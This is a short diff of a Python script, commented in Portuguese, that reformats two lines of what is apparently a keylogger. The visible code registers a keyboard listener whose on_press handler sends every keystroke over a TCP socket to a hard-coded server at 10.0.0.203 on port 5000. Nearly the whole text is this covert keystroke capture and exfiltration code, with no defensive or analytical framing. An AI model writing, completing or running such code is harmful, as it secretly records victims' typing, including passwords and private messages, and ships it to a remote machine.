@@ -9,8 +9,7 @@ SERVER = '10.0.0.203'
 # Porta que o Servidor está escutando
 PORT = 5000
 
-TCP = socket.socket(socket.AF_INET,
-                    socket.SOCK_STREAM)
+TCP = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 
 DESTINO = (SERVER, PORT)
 # Que faz a conexão no nosso servidor.
@@ -34,6 +33,5 @@ def on_press(key):
             TCP.send(keydata.encode())
 
 
-with keyboard.Listener(
-        on_press=on_press) as listener:
+with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
